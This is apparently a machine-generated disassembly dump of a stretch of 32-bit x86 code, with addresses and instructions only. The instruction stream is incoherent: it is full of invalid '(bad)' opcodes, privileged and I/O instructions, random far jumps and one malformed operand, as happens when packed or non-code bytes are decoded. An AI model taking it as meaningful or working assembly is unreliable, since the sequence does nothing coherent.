  41243e:	cmp    eax,0xdb3bb864
  412443:	js     0x4124ba
  412445:	xor    cl,BYTE PTR [ebx]
  412447:	in     eax,dx
  412448:	(bad)  
  412449:	lock stc 
  41244b:	lods   eax,DWORD PTR ds:[esi]
  41244c:	xor    ecx,DWORD PTR [esi-0x25a9ce16]
  412452:	popa   
  412453:	pop    ebx
  412454:	shr    BYTE PTR [ebx+0x396b822c],1
  41245a:	xchg   edx,eax
  41245b:	xchg   esp,eax
  41245c:	fsubr  st,st(6)
  41245e:	daa    
  41245f:	stc    
  412460:	sub    dh,BYTE PTR [ebx-0x3f]
  412463:	push   esp
  412464:	cmc    
  412465:	pop    edx
  412466:	push   ecx
  412467:	mov    al,0x63
  412469:	sti    
  41246a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41246b:	cld    
  41246c:	pushf  
  41246d:	loope  0x412454
  41246f:	clc    
  412470:	pop    ecx
  412471:	adc    cl,BYTE PTR [edi+0x717b9aca]
  412477:	mov    bl,0xc7
  412479:	mov    bl,0xf5
  41247b:	or     eax,0xae90d551
  412480:	test   DWORD PTR [edx],edx
  412482:	xor    edx,DWORD PTR [ecx]
  412484:	cmp    eax,DWORD PTR ds:0xf4817e0d
  41248a:	(bad)  
  41248b:	ins    DWORD PTR es:[edi],dx
  41248c:	push   ebx
  41248d:	idiv   BYTE PTR [edx+0x5ae41989]
  412493:	and    ch,BYTE PTR [ebp+0x128ca012]
  412499:	xor    al,0xf3
  41249b:	iret   
  41249c:	adc    BYTE PTR [ecx],ch
  41249e:	cmp    bl,BYTE PTR [ecx-0x1a]
  4124a1:	sti    
  4124a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124a3:	push   ecx
  4124a4:	mov    gs,eax
  4124a6:	inc    ecx
  4124a7:	dec    ebx
  4124a8:	stc    
  4124a9:	mov    ds:0xb8bbf620,eax
  4124ae:	xlat   BYTE PTR ds:[ebx]
  4124af:	pop    ds
  4124b0:	rol    BYTE PTR [ebx+0x13],0x2f
  4124b4:	sbb    eax,0x647d5b24
  4124b9:	(bad)  
  4124ba:	dec    edi
  4124bc:	in     al,0xee
  4124be:	shl    DWORD PTR [edx+0x29],cl
  4124c1:	or     eax,0xe827f6c5
  4124c6:	div    DWORD PTR [ecx+0x58]
  4124c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124ca:	inc    ecx
  4124cb:	and    dh,cl
  4124cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124ce:	js     0x41250a
  4124d0:	push   ecx
  4124d1:	adc    DWORD PTR [ebx+ebp*4-0x69],0x54
  4124d6:	shr    DWORD PTR [eax-0x4fab4087],cl
  4124dc:	mov    BYTE PTR [ecx],ah
  4124de:	in     eax,dx
  4124df:	adc    dl,BYTE PTR [ebp-0x7bce41c8]
  4124e5:	fcom   DWORD PTR [eax-0x5458d1df]
  4124eb:	in     eax,0xf
  4124ed:	icebp  
  4124ee:	fsub   QWORD PTR [ebx]
  4124f0:	cmc    
  4124f1:	and    DWORD PTR [eax+0x9],ecx
  4124f4:	push   ds
  4124f5:	fs inc esp
  4124f7:	lods   al,BYTE PTR ds:[esi]
  4124f8:	or     al,0xd6
  4124fa:	(bad)  
  4124fb:	imul   edx,ecx,0x5
  4124fe:	int    0x8f
  412500:	xchg   esi,eax
  412501:	je     0x41250b
  412503:	stos   DWORD PTR es:[edi],eax
  412504:	fldcw  WORD PTR [eax+0x65]
  412507:	add    DWORD PTR [ecx+0x346129d3],esi
  41250d:	push   eax
  41250e:	jge    0x41251e
  412510:	inc    esi
  412511:	ja     0x41256b
  412513:	sbb    DWORD PTR [ecx+0x14],edx
  412516:	mov    cl,0xcf
  412518:	dec    DWORD PTR [edx-0xa0a0f9f]
  41251e:	test   eax,0x721a8b79
  412523:	push   cs
  412524:	retf   0x1067
  412527:	pop    es
  412528:	test   DWORD PTR [ebp+0x3a],ebp
  41252b:	shl    al,cl
  41252d:	inc    edi
  41252e:	cmp    DWORD PTR [eax-0x295cff8a],ebp
  412534:	je     0x412506
  412536:	or     dh,BYTE PTR [ebx+0x1]
  412539:	mov    ch,0x8e
  41253b:	ss inc eax
  41253d:	mov    es,WORD PTR [ebx-0x13480d9f]
  412543:	leave  
  412544:	scas   eax,DWORD PTR es:[edi]
  412545:	dec    esi
  412546:	mov    eax,ds:0xa79dfe31
  41254b:	inc    ebp
  41254d:	sti    
  41254e:	push   0x640bdbad
  412553:	pop    ds
  412554:	bound  edi,QWORD PTR [edi-0x53f71b02]
  41255a:	in     eax,dx
  41255b:	inc    eax
  41255c:	mov    edx,0x25bc2814
  412561:	jno    0x412599
  412563:	ja     0x4125b7
  412565:	pop    esp
  412566:	mov    al,0x66
  412568:	js     0x4124f1
  41256a:	jecxz  0x4125a3
  41256c:	int3   
  41256d:	or     al,0x7d
  41256f:	sbb    DWORD PTR [esi+0x56a2b47a],edi
  412575:	pop    ds
  412576:	jmp    0xfcf9c39e
  41257b:	es mov esi,0x65a279a0
  412581:	das    
  412582:	adc    BYTE PTR [ebx-0x80],ah
  412585:	inc    edi
  412586:	dec    esi
  412587:	mov    ds:0xd3fdd86a,al
  41258c:	mov    dl,0xdd
  41258e:	outs   dx,BYTE PTR ds:[esi]
  41258f:	(bad)  
  412590:	fstp   DWORD PTR [ebx-0x29]
  412593:	adc    al,bl
  412595:	xchg   ebp,eax
  412596:	inc    ebx
  412597:	dec    edx
  412598:	dec    eax
  412599:	mov    bl,al
  41259b:	mov    dh,0xc9
  41259d:	test   ebx,esp
  41259f:	scas   eax,DWORD PTR es:[edi]
  4125a0:	cdq    
  4125a1:	xchg   ebx,eax
  4125a2:	addr16 pusha 
  4125a4:	sub    eax,0x49ba595f
  4125a9:	pop    ss
  4125aa:	data16 xchg BYTE PTR [edx-0x4fbee8ba],al
  4125b1:	stos   DWORD PTR es:[edi],eax
  4125b2:	mov    al,0xe9
  4125b4:	xor    esi,DWORD PTR [ecx+0x4d]
  4125b7:	fucomip st,st(4)
  4125b9:	inc    esi
  4125ba:	cmc    
  4125bb:	dec    esp
  4125bc:	fs push ss
  4125be:	aad    0x3b
  4125c0:	cli    
  4125c1:	ins    BYTE PTR es:[edi],dx
  4125c2:	mov    cl,0x88
  4125c4:	cmc    
  4125c5:	cmp    esi,DWORD PTR [eax+0x40f6dff0]
  4125cb:	mov    ecx,0x3f6d2a78
  4125d0:	sbb    ebp,0xcc0d152d
  4125d6:	mov    esp,0x1517582e
  4125db:	hlt    
  4125dc:	jo     0x4125a8
  4125de:	outs   dx,DWORD PTR ds:[esi]
  4125df:	or     edi,edi
  4125e1:	xchg   ebp,eax
  4125e2:	nop
  4125e3:	sub    DWORD PTR [ecx-0x30],0x30
  4125e7:	in     al,0xef
  4125e9:	push   0x10
  4125eb:	rol    DWORD PTR ds:0x589e895b,cl
  4125f1:	loopne 0x4125cf
  4125f3:	repnz dec edi
  4125f5:	in     al,0x5d
  4125f7:	pop    ecx
  4125f8:	mov    esi,esi
  4125fa:	mov    ds:0x521e10e2,al
  4125ff:	inc    esi
  412600:	mov    ch,bh
  412602:	aam    0xc3
  412604:	fidiv  WORD PTR [eax-0x9]
  412607:	jg     0x412671
  412609:	stos   BYTE PTR es:[di],al
  41260b:	mov    ebx,es
  41260d:	cmp    BYTE PTR [esi-0x2b76c7c8],0x43
  412614:	sbb    al,dl
  412616:	jmp    0x762a:0x56cac374
  41261d:	and    DWORD PTR [ebx-0x3],edx
  412620:	mov    edx,0x68f60052
  412625:	neg    DWORD PTR [edi+0x386201b6]
  41262b:	inc    esi
  41262c:	lds    eax,FWORD PTR [esi]
  41262e:	ret    0x18ba
  412631:	imul   edx
  412633:	xchg   edi,eax
  412634:	out    0x5d,eax
  412636:	hlt    
  412637:	cmp    ebp,DWORD PTR [eax+0x48]
  41263a:	jmp    0x412657
  41263c:	rcl    esi,0x1e
  41263f:	stos   BYTE PTR es:[edi],al
  412640:	cmp    bh,ch
  412642:	shr    esi,1
  412644:	jecxz  0x41262a
  412646:	dec    esi
  412647:	jbe    0x412633
  412649:	jmp    0x41267a
  41264b:	rcl    ebp,cl
  41264d:	in     al,dx
  41264e:	inc    ebx
  41264f:	push   ecx
  412650:	mov    edx,0x5710cc26
  412655:	ja     0x412699
  412657:	retf   
  412658:	jne    0x4125dc
  41265a:	iret   
  41265b:	ds mov esi,0xd1abfc0e
  412661:	out    0x93,al
  412663:	icebp  
  412664:	inc    ebx
  412665:	das    
  412666:	rol    DWORD PTR [ebp-0x4f],0x4f
  41266a:	addr16 leave 
  41266c:	xor    ah,BYTE PTR [bx-0xcf]
  412671:	pushf  
  412672:	dec    ebx
  412673:	jb     0x412640
  412675:	lea    eax,[edx+0x3300ced8]
  41267b:	pop    eax
  41267c:	fwait
  41267d:	in     al,0xbb
  41267f:	xchg   esp,eax
  412680:	inc    eax
  412681:	or     DWORD PTR [esi],eax
  412683:	sub    al,0x80
  412685:	cmp    bh,BYTE PTR [ecx-0x11]
  412688:	(bad)  
  41268a:	sub    DWORD PTR [ecx-0x45],0xfe1a8aff
  412691:	mov    edx,0x7ddc2704
  412696:	xchg   esp,eax
  412697:	mov    bh,0x65
  412699:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41269a:	lock (bad) 
  41269c:	(bad)  
  41269f:	sub    ecx,DWORD PTR [ebx-0x99ac296]
  4126a5:	pop    ebp
  4126a6:	sbb    edi,esi
  4126a8:	xlat   BYTE PTR ds:[ebx]
  4126a9:	mov    ds:0x278deb8f,al
  4126ae:	cmc    
  4126af:	daa    
  4126b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126b1:	xchg   ebx,eax
  4126b2:	xchg   ebx,eax
  4126b3:	inc    esi
  4126b4:	pop    ss
  4126b5:	or     dh,BYTE PTR [edx+edi*2]
  4126b8:	add    BYTE PTR [esi],ah
  4126ba:	or     al,0x42
  4126bc:	cmp    BYTE PTR [edx-0x2a],al
  4126bf:	leave  
  4126c0:	jle    0x4126f3
  4126c2:	pop    edx
  4126c3:	inc    esi
  4126c4:	(bad)  
  4126c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126c6:	dec    esi
  4126c7:	sbb    ecx,ecx
  4126c9:	dec    esp
  4126ca:	js     0x41264f
  4126cc:	scas   al,BYTE PTR es:[edi]
  4126cd:	sahf   
  4126ce:	xor    BYTE PTR [esi],cl
  4126d0:	lahf   
  4126d1:	cmc    
  4126d2:	jnp    0x41270e
  4126d4:	sti    
  4126d5:	mov    edx,0x7aceb3be
  4126da:	cdq    
  4126db:	cmp    eax,DWORD PTR [ecx-0x7b7b0084]
  4126e1:	sub    eax,0x6a012f19
  4126e6:	sahf   
  4126e7:	cld    
  4126e8:	xchg   ebx,eax
  4126e9:	fdiv   st(3),st
  4126eb:	jno    0x41271d
  4126ed:	ror    DWORD PTR [eax-0x31],0xca
  4126f1:	xlat   BYTE PTR ds:[ebx]
  4126f2:	(bad)  
  4126f3:	hlt    
  4126f4:	retf   
  4126f5:	outs   dx,BYTE PTR ds:[esi]
  4126f6:	sbb    dh,cl
  4126f8:	jo     0x412763
  4126fa:	rcl    BYTE PTR [esi],0x8d
  4126fd:	je     0x4126a9
  4126ff:	mov    ah,0xb4
  412701:	dec    ebx
  412702:	mov    ecx,0x3b34837d
  412707:	ficom  WORD PTR [ebp+eax*1+0x31b9e11]
  41270e:	jp     0x412716
  412710:	outs   dx,DWORD PTR ds:[esi]
  412711:	cmp    BYTE PTR [edx],dh
  412713:	test   eax,0xf350624
  412718:	or     ch,BYTE PTR [esi-0x51120ef8]
  41271e:	lods   al,BYTE PTR ds:[esi]
  41271f:	rol    BYTE PTR [edx],0x62
  412722:	jge    0x4126bf
  412724:	ins    BYTE PTR es:[edi],dx
  412725:	mov    ds,WORD PTR [edi]
  412727:	mov    bl,0xf9
  412729:	mov    ah,0xad
  41272b:	push   0x3c9b999e
  412730:	dec    ebx
  412731:	and    al,0xba
  412733:	mov    dl,0x30
  412735:	adc    eax,0x78a4974e
  41273a:	mov    bh,BYTE PTR [ebp-0x43df72fa]
  412740:	ins    BYTE PTR es:[edi],dx
  412741:	outs   dx,BYTE PTR ds:[esi]
  412742:	out    0xd5,eax
  412744:	sbb    ah,bl
  412746:	inc    edi
  412747:	push   esp
  412748:	sub    ecx,esi
  41274a:	imul   ebp,DWORD PTR [edx+ecx*2+0x6ffa3466],0xffffffc7
  412752:	push   ebx
  412753:	bound  edx,QWORD PTR [eax]
  412755:	idiv   DWORD PTR [ebp-0x3]
  412758:	mov    ebx,ebx
  41275a:	cmp    bl,BYTE PTR [ebx]
  41275c:	int3   
  41275d:	test   dh,0xd3
  412760:	and    ch,al
  412762:	in     al,dx
  412763:	mov    ?,ebx
  412765:	daa    
  412766:	js     0x4127be
  412768:	mov    ch,0xce
  41276a:	adc    BYTE PTR [edi],ah
  41276c:	test   al,0xff
  41276e:	test   DWORD PTR [edi],esp
  412770:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412771:	retf   0xaafb
  412774:	dec    esp
  412775:	in     eax,0x69
  412777:	in     al,dx
  412778:	mov    es,WORD PTR [esi+0x5e3574bf]
  41277e:	add    DWORD PTR [edi],ebp
  412780:	xor    BYTE PTR [edi+0x14d94d30],al
  412786:	lds    edx,FWORD PTR [ebx-0xf]
  412789:	jle    0x41280a
  41278b:	out    0xb4,eax
  41278d:	dec    ebx
  41278e:	dec    ebx
  41278f:	mov    ds:0x8ba34270,al
  412794:	cmp    BYTE PTR [ebx],al
  412796:	(bad)  
  412799:	xchg   ebx,eax
  41279a:	xchg   ebx,eax
  41279b:	xchg   esp,eax
  41279c:	xchg   ebp,eax
  41279d:	rol    DWORD PTR [ebx-0x6002a94b],cl
  4127a3:	jb     0x412728
  4127a5:	pop    edi
  4127a6:	mov    ds:0x7f9f6913,al
  4127ab:	cwde   
  4127ac:	dec    edx
  4127ad:	mov    eax,ds:0x2f68981e
  4127b2:	or     ebx,edi
  4127b4:	into   
  4127b5:	(bad)  
  4127b7:	mov    edx,0x43710abf
  4127bc:	pop    ecx
  4127bd:	cmc    
  4127be:	outs   dx,DWORD PTR ds:[esi]
  4127bf:	push   ecx
  4127c0:	js     0x41276c
  4127c2:	in     al,0xea
  4127c4:	rcr    DWORD PTR [edx+0x180867ea],0x99
  4127cb:	cmp    cl,BYTE PTR [ecx]
  4127cd:	mov    ecx,0xc1213fa
  4127d2:	mov    ah,dl
  4127d4:	rol    DWORD PTR [edx],1
  4127d6:	jno    0x4127f2
  4127d8:	push   ebp
  4127d9:	jbe    0x412836
  4127db:	pop    esi
  4127dc:	and    edx,DWORD PTR [edx]
  4127de:	mov    BYTE PTR [ebx-0x2c],ch
  4127e1:	pop    edx
  4127e2:	add    al,0x55
  4127e4:	jb     0x412853
  4127e6:	mov    eax,0x57fb3d27
  4127eb:	cmp    BYTE PTR [ebx-0x64],dl
  4127ee:	inc    ecx
  4127ef:	int3   
  4127f0:	sbb    bh,BYTE PTR [esi+0x2f]
  4127f3:	jp     0x4127f4
  4127f5:	mov    al,ds:0x6e735449
  4127fa:	fnsave [edx-0x7bdbf5de]
  412800:	lahf   
  412801:	call   0xb967:0x91de66f9
  412808:	pop    ecx
  412809:	push   cs
  41280a:	sub    dh,BYTE PTR [edi+eax*8]
  41280d:	inc    eax
  41280e:	mov    edi,0xce10aa8f
  412813:	pop    ss
  412814:	mov    ds:0x60e39cfc,al
  412819:	mov    bl,0x2f
  41281b:	inc    ebx
  41281c:	popa   
  41281d:	or     eax,0xeb6b1538
  412822:	mov    edi,0xf9c5df74
  412827:	iret   
  412828:	ret    
  412829:	mov    ebx,0xef77f778
  41282e:	add    ebx,DWORD PTR [eax-0x28]
  412831:	rcl    DWORD PTR [eax],1
  412833:	fistp  WORD PTR [ebp-0x7a708e2f]
  412839:	(bad)  
  41283b:	fnstenv [esi+0x4eabea01]
  412841:	push   es
  412842:	mov    esi,0x35c8ad89
  412847:	sbb    cl,BYTE PTR [ecx]
  412849:	icebp  
  41284a:	int3   
  41284b:	je     0x412833
  41284d:	pop    ebx
  41284e:	mov    ecx,0x5ba08c63
  412853:	mov    ah,0x30
  412855:	cli    
  412856:	adc    DWORD PTR [edx],ebx
  412858:	pop    eax
  412859:	xchg   ebx,eax
  41285a:	jg     0x412826
  41285c:	(bad)  
  41285d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41285e:	ins    BYTE PTR es:[edi],dx
  41285f:	jne    0x4127fd
  412861:	and    dl,bl
  412863:	pop    eax
  412864:	and    edx,DWORD PTR [ebx-0x39]
  412867:	sar    DWORD PTR [edx+edi*8],cl
  41286a:	inc    edi
  41286b:	jb     0x41286e
  41286d:	(bad)  
  41286e:	mov    esp,0x2858c7f1
  412873:	mov    esp,DWORD PTR [eax]
  412875:	mov    eax,0xe55e09bb
  41287a:	jmp    0x41281a
  41287c:	push   esp
  41287d:	(bad)  
  41287e:	fcomp  DWORD PTR [ebx+edi*8]
  412881:	mov    ebx,DWORD PTR [ebp-0x12]
  412884:	xchg   ebp,eax
  412885:	repnz rcl bh,cl
  412888:	xor    edx,0x3b
  41288b:	or     edx,DWORD PTR [edi-0x297dd789]
  412891:	shr    DWORD PTR [ebp-0x5118808c],1
  412897:	xlat   BYTE PTR ds:[ebx]
  412898:	ror    BYTE PTR [ecx+0x6ef0f162],1
  41289e:	mov    ch,0x8c
  4128a0:	xor    DWORD PTR [ecx+ebx*1+0x4dbe5851],ecx
  4128a7:	(bad)  
  4128a8:	and    edx,edi
  4128aa:	imul   edi,DWORD PTR [edi],0x38
  4128ad:	xchg   ecx,eax
  4128ae:	stos   BYTE PTR es:[edi],al
  4128af:	jne    0x41284f
  4128b1:	jne    0x4128be
  4128b3:	jecxz  0x4128e9
  4128b5:	xchg   edx,eax
  4128b6:	je     0x41289d
  4128b8:	xchg   edx,eax
  4128b9:	cmp    al,0xae
  4128bb:	adc    BYTE PTR [ecx-0x5d89028d],0x20
  4128c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128c3:	and    eax,0xd3f3c728
  4128c8:	mov    eax,0xfc89a9ef
  4128cd:	(bad)  
  4128ce:	xlat   BYTE PTR ds:[ebx]
  4128cf:	mov    dl,0xeb
  4128d1:	ret    
  4128d2:	add    BYTE PTR [edx+0x7c],dl
  4128d5:	scas   eax,DWORD PTR es:[edi]
  4128d6:	loopne 0x412883
  4128d8:	mov    ch,0xf7
  4128da:	rcr    WORD PTR [esi-0x3bbbfd86],0x9e
  4128e2:	jns    0x4128d0
  4128e4:	sbb    al,0xb
  4128e6:	rcl    DWORD PTR [esi-0x5],cl
  4128e9:	pop    esi
  4128ea:	loop   0x412948
  4128ec:	aaa    
  4128ed:	adc    bh,dh
  4128ef:	xchg   esi,eax
  4128f0:	mov    al,0xe8
  4128f2:	jno    0x4128f2
  4128f4:	dec    ebp
  4128f5:	cwde   
  4128f6:	xor    eax,0xfdef8bcb
  4128fb:	fucomp st(4)
  4128fd:	in     al,0x42
  4128ff:	not    BYTE PTR [ebx]
  412901:	mov    ah,BYTE PTR ds:0xdca43e0
  412907:	and    edx,DWORD PTR ds:0xeae4499e
  41290d:	pop    edx
  41290e:	sbb    DWORD PTR [ecx+0x61c6012b],esi
  412914:	sbb    bl,dh
  412916:	popa   
  412917:	adc    ah,dl
  412919:	ja     0x412950
  41291b:	adc    ah,dh
  41291d:	aaa    
  41291e:	aam    0x21
  412920:	fsubr  st,st(7)
  412922:	fucomp st(2)
  412924:	pop    ss
  412925:	inc    edi
  412926:	(bad)  
  412927:	adc    ah,BYTE PTR [ecx-0x4f]
  41292a:	test   al,0x62
  41292c:	jnp    0x412925
  41292e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41292f:	dec    ebx
  412930:	dec    esp
  412931:	ret    0x99fd
  412934:	sub    DWORD PTR [ecx+edi*8+0xe],edx
  412938:	out    dx,al
  412939:	loop   0x4128d2
  41293b:	pop    ebx
  41293c:	loope  0x412951
  41293e:	scas   al,BYTE PTR es:[edi]
  41293f:	outs   dx,DWORD PTR ds:[esi]
  412940:	mov    dl,0xd3
  412942:	pop    ss
  412943:	fs pop eax
  412945:	jne    0x412949
  412947:	lea    ebx,[ebx+0x48]
  41294a:	pusha  
  41294b:	xchg   esp,eax
  41294c:	mov    ch,BYTE PTR [edi-0x57a1b713]
  412952:	cmp    eax,0x3fdb2ba6
  412957:	jbe    0x4129b8
  412959:	dec    edx
  41295a:	iret   
  41295b:	int3   
  41295c:	adc    eax,0xd2c8f2ec
  412961:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412962:	xlat   BYTE PTR ds:[ebx]
  412963:	jmp    0x803e:0x30fc90f2
  41296a:	outs   dx,DWORD PTR ds:[esi]
  41296b:	(bad)  
  41296c:	pop    ebp
  41296d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41296e:	es push edi
  412970:	cdq    
  412971:	cmp    esi,DWORD PTR [edi-0x76c81228]
  412977:	mov    ds:0xebe1fd2f,al
  41297c:	test   DWORD PTR [edx+eiz*4-0x3e8a482f],edi
  412983:	repnz loopne 0x412983
  412986:	xchg   ebx,eax
  412987:	imul   edx,ebx,0x28ba39bc
  41298d:	and    ecx,esp
  41298f:	stos   BYTE PTR es:[edi],al
  412990:	sub    al,0x68
  412992:	das    
  412993:	xor    DWORD PTR [ecx+0x381dd7bd],edx
  412999:	outs   dx,DWORD PTR ds:[esi]
  41299a:	mov    bh,0x14
  41299c:	sahf   
  41299d:	int    0x40
  41299f:	int3   
  4129a0:	leave  
  4129a1:	dec    eax
  4129a2:	jge    0x412949
  4129a4:	cmc    
  4129a5:	push   ebp
  4129a6:	push   edx
  4129a7:	std    
  4129a8:	xor    ebp,DWORD PTR [ecx]
  4129aa:	ds adc ecx,esi
  4129ad:	jmp    0x412a27
  4129af:	pop    eax
  4129b0:	sub    ebx,DWORD PTR [ebp+0x23fe82a5]
  4129b6:	mov    DWORD PTR [edi],esp
  4129b8:	pop    esp
  4129b9:	and    ch,BYTE PTR [ebx+edx*4-0x21]
  4129bd:	mov    edi,0xe4f01796
  4129c2:	mov    dh,0xb7
  4129c4:	xor    dh,BYTE PTR ss:[edx-0x1e0490aa]
  4129cb:	xor    esp,DWORD PTR [edi+0x3]
  4129ce:	cmp    eax,0x17c5e340
  4129d3:	xchg   esp,eax
  4129d4:	push   esp
  4129d5:	leave  
  4129d6:	sbb    dl,BYTE PTR [ebx+ecx*8-0x3d]
  4129da:	mov    esp,0xf5a5e42f
  4129df:	inc    ebp
  4129e0:	dec    edx
  4129e1:	dec    ebp
  4129e2:	fidivr WORD PTR [ebx-0x3d]
  4129e5:	sub    ebp,DWORD PTR [ebx]
  4129e7:	(bad)  
  4129e8:	jae    0x4129ce
  4129ea:	jg     0x4129dd
  4129ec:	xor    DWORD PTR ds:0x7cb80bd2,ecx
  4129f2:	outs   dx,BYTE PTR ds:[esi]
  4129f3:	(bad)  
  4129f4:	(bad)  
  4129f5:	rcr    DWORD PTR [ecx],0x35
  4129f8:	jge    0x4129cc
  4129fa:	mov    esi,0x7de19cfc
  4129ff:	sti    
  412a00:	sbb    edi,DWORD PTR [ebx-0xe]
  412a03:	dec    edx
  412a04:	loopne 0x412a11
  412a06:	inc    eax
  412a07:	jne    0x412a4e
  412a09:	pop    es
  412a0a:	imul   DWORD PTR [edx+0x5c]
  412a0d:	or     BYTE PTR [edi],ah
  412a0f:	outs   dx,DWORD PTR ds:[esi]
  412a10:	ds dec edx
  412a12:	inc    ebp
  412a13:	loop   0x4129a6
  412a15:	push   cs
  412a16:	mov    bl,0x68
  412a18:	mov    DWORD PTR [ebp-0x208e19bb],eax
  412a1e:	xchg   BYTE PTR [ebx],ah
  412a20:	push   eax
  412a21:	cs sahf 
  412a23:	aad    0x59
  412a25:	push   edi
  412a26:	mov    ss,WORD PTR [ebp+0x65]
  412a29:	dec    esi
  412a2a:	mov    ecx,0xe9e42457
  412a2f:	imul   esi,edx,0x7849814d
  412a35:	mov    ecx,0xcb5cd4bb
  412a3a:	repz fidiv WORD PTR [ebx+0x15]
  412a3e:	lods   al,BYTE PTR ds:[esi]
  412a3f:	mov    ebp,0x345fc5ca
  412a44:	(bad)  
  412a45:	cli    
  412a46:	std    
  412a47:	sub    ebp,ecx
  412a49:	cs pop ebp
  412a4b:	fiadd  WORD PTR [edi-0x7a656c7d]
  412a51:	retf   0x72a7
  412a54:	pop    esp
  412a55:	rcl    esp,1
  412a57:	jnp    0x412a00
  412a59:	pop    esp
  412a5a:	push   edi
  412a5b:	cmp    al,0xb5
  412a5d:	mov    al,0x51
  412a5f:	or     al,0xdc
  412a61:	lods   eax,DWORD PTR ds:[esi]
  412a62:	inc    esi
  412a63:	and    DWORD PTR [edi+eax*8],esp
  412a66:	ins    BYTE PTR es:[edi],dx
  412a67:	aam    0xab
  412a69:	sub    ebx,esp
  412a6b:	or     ebp,DWORD PTR [ebx+0x14]
  412a6e:	mov    ch,0xa1
  412a70:	rcl    DWORD PTR [eax+0x5a],1
  412a73:	fs (bad) 
  412a75:	icebp  
  412a76:	repnz pop ebx
  412a78:	and    dh,cl
  412a7a:	sar    BYTE PTR [ebx+esi*8],0xe9
  412a7e:	cmp    BYTE PTR [eax+eiz*1-0x37],cl
  412a82:	push   esp
  412a83:	cdq    
  412a84:	push   esi
  412a85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a86:	jge    0x412ae2
  412a88:	jg     0x412a6c
  412a8a:	mov    edi,0x1edffd1f
  412a8f:	fwait
  412a90:	aas    
  412a91:	xchg   edi,eax
  412a92:	scas   al,BYTE PTR es:[edi]
  412a93:	lahf   
  412a94:	into   
  412a95:	mov    ch,0xa6
  412a97:	adc    al,0x5e
  412a99:	ret    
  412a9a:	(bad)  
  412a9b:	pusha  
  412a9c:	xor    DWORD PTR [esi],edx
  412a9e:	leave  
  412a9f:	xchg   ecx,eax
  412aa0:	push   esp
  412aa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412aa2:	ret    
  412aa3:	ficomp WORD PTR [ecx-0x62]
  412aa6:	add    DWORD PTR [eax-0x326dbe69],0x761686ac
  412ab0:	sbb    DWORD PTR [eax+0x18154166],eax
  412ab6:	and    eax,0x43f10189
  412abb:	dec    esi
  412abc:	je     0x412ad2
  412abe:	inc    ebx
  412abf:	mov    al,ds:0xb761288f
  412ac4:	or     eax,0x5ca6cad7
  412ac9:	pop    esp
  412aca:	push   edi
  412acb:	add    eax,0xc60e0f3c
  412ad0:	mov    ch,0xb5
  412ad2:	div    DWORD PTR [ecx]
  412ad4:	sbb    ebx,DWORD PTR [edi+edi*4]
  412ad7:	and    bh,ah
  412ad9:	or     esp,esp
  412adb:	mov    bl,0x77
  412add:	iret   
  412ade:	inc    eax
  412adf:	out    0x9c,eax
  412ae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ae2:	adc    BYTE PTR ds:0x74b8423b,dl
  412ae8:	movzx  ebp,WORD PTR [ebx]
  412aeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412aec:	xlat   BYTE PTR ds:[ebx]
  412aed:	addr16 dec ebx
  412aef:	mov    esi,ds
  412af1:	add    eax,DWORD PTR [edi-0x308f3caa]
  412af7:	and    edx,DWORD PTR [eax]
  412af9:	cmp    esp,DWORD PTR [eax]
  412afb:	(bad)  
  412afc:	mov    cl,0xe3
  412afe:	pop    eax
  412aff:	xchg   edx,eax
  412b00:	(bad)  
  412b01:	(bad)  
  412b02:	mov    bh,0xcf
  412b04:	adc    ecx,DWORD PTR [ebp+0x65f178e9]
  412b0a:	mov    ch,BYTE PTR [esi+0x7629e276]
  412b10:	sahf   
  412b11:	out    dx,al
  412b12:	mov    dl,0xc6
  412b14:	daa    
  412b15:	xchg   esi,eax
  412b16:	scas   eax,DWORD PTR es:[edi]
  412b17:	cmp    ebx,DWORD PTR [edx-0x3856144a]
  412b1d:	test   al,0x82
  412b1f:	arpl   WORD PTR [edx+0x1c22ed44],ax
  412b25:	xchg   ebp,eax
  412b26:	fldenv [edx+0x68]
  412b29:	sub    DWORD PTR [ebp+0x61],ebx
  412b2c:	push   es
  412b2d:	test   al,0x8d
  412b2f:	jno    0x412b3d
  412b31:	js     0x412b2e
  412b33:	cmp    al,0x56
  412b35:	mov    cl,0xa2
  412b37:	mov    ds,WORD PTR [ecx+0x5c68114d]
  412b3d:	jl     0x412aeb
  412b3f:	mov    dh,0x12
  412b41:	pop    ds
  412b42:	cli    
  412b43:	push   ecx
  412b44:	inc    ecx
  412b45:	ins    DWORD PTR es:[edi],dx
  412b46:	jnp    0x412aed
  412b48:	adc    DWORD PTR [esi],esi
  412b4a:	fld    TBYTE PTR [eax+edi*8-0x64024d4f]
  412b51:	loope  0x412adb
  412b53:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  412b55:	sbb    BYTE PTR [esi],bl
  412b57:	mov    WORD PTR [ecx],fs
  412b59:	add    eax,0xe363b82b
  412b5e:	jns    0x412b67
  412b60:	inc    esp
  412b61:	aaa    
  412b62:	xchg   esp,eax
  412b63:	or     ch,BYTE PTR [edx-0x5]
  412b66:	int    0x72
  412b68:	mov    cl,0xb2
  412b6a:	dec    ecx
  412b6b:	xchg   edx,eax
  412b6c:	push   edx
  412b6d:	xchg   esi,eax
  412b6e:	aaa    
  412b6f:	jae    0x412b4a
  412b71:	add    eax,0xb140aff5
  412b76:	mov    BYTE PTR [ebx+edx*1-0x75],al
  412b7a:	jmp    0xfab0:0xf57545e9
  412b81:	scas   al,BYTE PTR es:[edi]
  412b82:	mov    bh,0xb
  412b84:	xchg   edx,eax
  412b85:	or     ch,BYTE PTR [edi]
